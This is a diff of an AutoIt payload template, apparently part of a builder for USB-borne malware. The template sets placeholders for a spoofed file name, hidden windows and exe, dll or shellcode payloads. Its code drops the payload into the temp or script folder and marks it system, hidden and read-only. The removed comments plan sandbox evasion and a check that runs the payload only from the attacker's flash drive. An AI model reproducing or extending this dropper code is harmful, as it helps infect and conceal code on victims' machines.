@@ -1,10 +1,4 @@
-;Payload Template Version: 0.5.0a
-
-;TODO: * Read return values for a fail safe system
-;      * Workround sand boxes
-;      * Circumvent Flash drive malwares as they can pose a problem with the directories and execution
-;      * create a system to bound the payload to only execute on the attackers' flash drive.
-;      * Hash some flash drive malware for the circumvention mode
+;Payload Template Version: 0.6.0a
 
 ;String Format Placeholder values
 ; 0  - #RequireAdmin pre-processor
@@ -12,12 +6,11 @@
 ; 2  - Execute through console (bool)
 ; 3  - Stream console output to a text file (bool)
 ; 4  - Execute in victims' drive (bool)
-; 5  - Wait for payload to finish (bool)
-; 6  - Payload name (string)
-; 7  - Spoofed File name (string)
-; 8  - Hide/Show Payload Window (Macro | @SW_SHOW / @SW_HIDE)
-; 9  - Console command execution switch (String | /k or /c)
-; 10 - Type of payload (integer | 0 = payload / 2 = dll payload / 3 = shell code)
+; 5  - Payload name (string)
+; 6  - Spoofed File name (string)
+; 7  - Hide/Show Payload Window (Macro | @SW_SHOW / @SW_HIDE)
+; 8  - Console command execution switch (String | /k or /c)
+; 9 - Type of payload (integer | 0 = payload / 1 = dll payload / 2 = shell code)
 
 #NoTrayIcon
 {0} 
@@ -26,12 +19,11 @@ Global $arguments = "{1}"
 Global $cmd = {2}
 Global $cmdstream = {3}
 Global $execdrive = {4}
-Global $waitpayload = {5}
-Global $nmpayload = "{6}"
-Global $nmspoof = "{7}"
-Global $showwin = {8}
-Global $conswitch = "{9}"
-Global $payloadtype = {10}
+Global $nmpayload = "{5}"
+Global $nmspoof = "{6}"
+Global $showwin = {7}
+Global $conswitch = "{8}"
+Global $payloadtype = {9}
 Global $drive = StringLeft(@ScriptDir, 3)
 Global $spoofarguments, $payloadtarget, $spooftarget
 
@@ -51,14 +43,16 @@ EndIf
 Func extractPayload()
     ;Extract the Payload
     If $execdrive Then
-        $payloadtarget = @TempDir & "\" & $nmpayload
+            $payloadtarget = @TempDir & "\" & $nmpayload
     Else
         $payloadtarget = @ScriptDir & "\" & $nmpayload
     EndIf
 
-    If FileExists($payloadtarget) = False Then
-        FileInstall("$payloadtmp", $payloadtarget, 1)
-        FileSetAttrib($payloadtarget, "+S +H +R")
+    If $payloadtype <> 2 Then
+        If FileExists($payloadtarget) = False Then
+            FileInstall("$payloadtmp", $payloadtarget, 1)
+            FileSetAttrib($payloadtarget, "+S +H +R")
+        EndIf
     EndIf
 
     ;Execute Payload
